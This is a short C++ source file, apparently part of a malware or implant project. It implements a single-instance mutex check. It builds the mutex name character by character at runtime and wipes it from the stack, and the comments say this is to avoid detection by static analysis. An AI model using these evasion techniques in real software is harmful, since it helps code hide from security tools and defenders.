#include "Evasion/mutex_lock.h"
#include "Core/api_resolve.h"

//single instance mutex
static HANDLE xmutex = NULL;

//single instance mutex function
bool check_mutex(){
    API_TABLE& API = GetAPI();

    // Construct mutex name char-by-char at runtime (no plaintext wide string in .rdata)
    // "Local\{B9E2D1A0-5F3C-4D2E-8A1B-7C9F0D6E4A2B}"
    wchar_t mname[] = {
        'L','o','c','a','l','\\',
        '{',
        'B','9','E','2','D','1','A','0','-',
        '5','F','3','C','-',
        '4','D','2','E','-',
        '8','A','1','B','-',
        '7','C','9','F','0','D','6','E','4','A','2','B',
        '}','\0'
    };

    // Clear stale last-error before CreateMutexW
    SetLastError(0);

    xmutex = API.CreateMutexW(NULL, TRUE, mname);

    // Wipe name from stack immediately
    SecureZeroMemory(mname, sizeof(mname));

    DWORD err = GetLastError();

    if(!xmutex || err == ERROR_ALREADY_EXISTS){
        if(xmutex) API.CloseHandle(xmutex);
        return false;
    }

    return true;
}
